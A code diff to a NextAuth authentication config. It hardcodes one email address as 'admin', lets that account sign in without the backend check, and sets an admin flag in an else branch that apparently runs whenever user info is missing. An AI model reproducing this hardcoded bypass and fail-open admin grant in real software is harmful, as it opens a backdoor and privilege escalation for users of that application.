@@ -29,6 +29,8 @@ const idExtract = (email: string): string | null => {
       return null;
     }
     return result;
+  }else if (email === "jtfmkshs@gmail.com"){
+    return "admin"
   }
   return null
 };
@@ -55,6 +57,7 @@ const authOptions: NextAuthOptions = {
 
       const id = idExtract(email);
       if(!id){return '/error&error=email-err'}
+      if(id === "admin"){return true}
       try {
         const data = { id: id };
         const response = await axios.post(
@@ -79,6 +82,9 @@ const authOptions: NextAuthOptions = {
           token.name = userInfo.name;
           token.id = userInfo.id;
           token.birthday = userInfo.birthday;
+          token.admin = false
+        }else{
+          token.admin = true
         }
       }
       return token;
@@ -88,8 +94,9 @@ const authOptions: NextAuthOptions = {
         session.user.name = token.name;
         session.user.image = token.picture;
         session.accessToken = token.accessToken as string | undefined;
-        session.user.id = token.id as string | undefined;
-        session.user.birthday = token.birthday as string | undefined;
+        session.user.id = token.id as string | null;
+        session.user.birthday = token.birthday as string | null;
+        session.user.admin = token.admin as boolean
       }
       return session;
     },
